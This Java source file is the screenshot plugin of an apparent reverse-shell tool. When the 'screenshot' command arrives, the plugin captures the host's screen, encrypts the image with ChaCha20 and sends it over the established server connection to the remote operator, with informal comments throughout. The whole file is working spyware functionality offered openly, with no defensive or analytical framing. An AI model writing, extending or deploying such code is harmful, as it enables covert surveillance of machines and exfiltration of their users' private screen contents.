package obs1d1anc1ph3r.reverseshell.plugins;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.utils.ScreenShot;

public class ScreenshotCommand implements CommandPlugin {

	private final ScreenShot screenShot = new ScreenShot();
	private ServerConnection serverConnection;
	private static final Logger logger = Logger.getLogger(ScreenshotCommand.class.getName());

	@Override
	public String getCommandName() {
		return "screenshot";
	}

	@Override
	public String execute(String[] args) {
		if (serverConnection == null) {
			logger.severe("ServerConnection is not initialized.");
			return "Error: Server connection not set.";
		}

		byte[] imageBytes = screenShot.imageBytes();
		if (imageBytes != null && imageBytes.length > 0) {
			sendScreenShot(imageBytes);
			return ""; //I didn't want it to really say anything
		} else {
			try {
				serverConnection.sendEncryptedResponse("Error: Failed to capture screenshot.");
			} catch (Exception ex) {
				logger.log(Level.SEVERE, "Failed to send error response", ex);
			}
			return "Error: Failed to capture screenshot.";
		}
	}

	private void sendScreenShot(byte[] imageBytes) {
		try {
			if (imageBytes.length > 0) {
				byte[] nonce = ChaCha20.generateNonce(); //Stupid hat
				byte[] encryptedData = ChaCha20.encrypt(serverConnection.getSessionKey(), nonce, imageBytes); //Encrypt the stuff
				serverConnection.sendEncryptedResponse("screenshot"); //Server needs to know what's up
				serverConnection.getDataOut().writeInt(nonce.length + encryptedData.length); //Server also needs to know the lengths
				serverConnection.getDataOut().write(nonce); //Server needs to know the stupid hat
				serverConnection.getDataOut().write(encryptedData); //Send the encrypted data
				serverConnection.getDataOut().flush(); //It's gross if you don't

			} else {
				logger.warning("Empty screenshot data, nothing sent.");
				serverConnection.sendEncryptedResponse("Error: Failed to capture screenshot.");
			}
		} catch (IOException ex) {
			logger.log(Level.SEVERE, "Failed to send screenshot", ex);
		} catch (Exception ex) {
			logger.log(Level.SEVERE, "Unexpected error", ex);
		}
	}

	public void setServerConnection(ServerConnection serverConnection) {
		this.serverConnection = serverConnection;
	}
}
